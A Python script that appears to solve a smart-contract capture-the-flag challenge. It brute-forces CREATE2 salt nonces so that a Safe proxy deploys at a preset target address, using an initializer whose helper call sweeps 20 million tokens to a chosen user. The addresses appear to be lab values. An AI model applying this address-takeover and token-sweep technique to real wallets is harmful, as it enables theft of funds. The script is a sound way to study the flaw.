from __future__ import annotations

from dataclasses import dataclass

import rlp
from eth_abi import encode
from eth_keys import keys
from eth_utils import keccak, to_canonical_address


@dataclass(frozen=True)
class Params:
    player: str
    user_label: str
    token: str
    proxy_factory: str
    singleton: str
    target: str
    amount: int


def addr_from_label(label: str) -> str:
    pk_int = int.from_bytes(keccak(text=label), "big")
    pk = keys.PrivateKey(pk_int.to_bytes(32, "big"))
    return pk.public_key.to_checksum_address()


def create_address(sender: str, nonce: int) -> str:
    sender_bytes = to_canonical_address(sender)
    enc = rlp.encode([sender_bytes, b""]) if nonce == 0 else rlp.encode([sender_bytes, nonce])
    return "0x" + keccak(enc)[12:].hex()


def safe_setup_initializer(*, token: str, user: str, helper: str, amount: int) -> bytes:
    selector_sweep = keccak(text="sweep(address,address,uint256)")[:4]
    setup_data = selector_sweep + encode(["address", "address", "uint256"], [token, user, amount])

    selector_setup = keccak(text="setup(address[],uint256,address,bytes,address,address,uint256,address)")[:4]
    args_setup = encode(
        ["address[]", "uint256", "address", "bytes", "address", "address", "uint256", "address"],
        [
            [user],
            1,
            helper,
            setup_data,
            "0x0000000000000000000000000000000000000000",
            "0x0000000000000000000000000000000000000000",
            0,
            "0x0000000000000000000000000000000000000000",
        ],
    )
    return selector_setup + args_setup


def get_safeproxy_creation_code() -> bytes:
    # Requires `forge` available. This returns init (creation) bytecode.
    import subprocess

    creation_hex = subprocess.check_output(
        ["forge", "inspect", "SafeProxy", "bytecode"],
        text=True,
    ).strip()
    if creation_hex.startswith("0x"):
        creation_hex = creation_hex[2:]
    return bytes.fromhex(creation_hex)


def compute_create2_address(*, factory: str, salt32: bytes, init_code_hash: bytes) -> str:
    h = keccak(b"\xff" + to_canonical_address(factory) + salt32 + init_code_hash)
    return "0x" + h[12:].hex()


def main() -> None:
    params = Params(
        player="0x44E97aF4418b7a17AABD8090bEA0A471a366305C",
        user_label="user",
        token="0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b",
        proxy_factory="0x6B35AE5369Ee7c8Bf7beb043B9BB3D0613aA0DC0",
        singleton="0xEB473f2D355b4d6780B3d1FeFD12587021B04f83",
        target="0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496",
        amount=20_000_000 * 10**18,
    )

    user = addr_from_label(params.user_label)

    attacker = create_address(params.player, 0)
    helper = create_address(attacker, 1)

    initializer = safe_setup_initializer(token=params.token, user=user, helper=helper, amount=params.amount)
    initializer_hash = keccak(initializer)

    safeproxy_creation = get_safeproxy_creation_code()
    deployment_data = safeproxy_creation + int(params.singleton, 16).to_bytes(32, "big")
    init_code_hash = keccak(deployment_data)

    target = params.target.lower()

    print("user      :", user)
    print("attacker  :", attacker)
    print("helper    :", helper)
    print("factory   :", params.proxy_factory)
    print("singleton :", params.singleton)
    print("target    :", params.target)

    # Brute force
    limit = 200_000_000
    for salt_nonce in range(limit):
        # salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce))
        salt = keccak(initializer_hash + salt_nonce.to_bytes(32, "big"))
        predicted = compute_create2_address(factory=params.proxy_factory, salt32=salt, init_code_hash=init_code_hash)
        if predicted.lower() == target:
            print("FOUND saltNonce:", salt_nonce)
            return
        if salt_nonce != 0 and salt_nonce % 5_000_000 == 0:
            print("...", salt_nonce)

    print("NOT FOUND up to", limit)


if __name__ == "__main__":
    main()
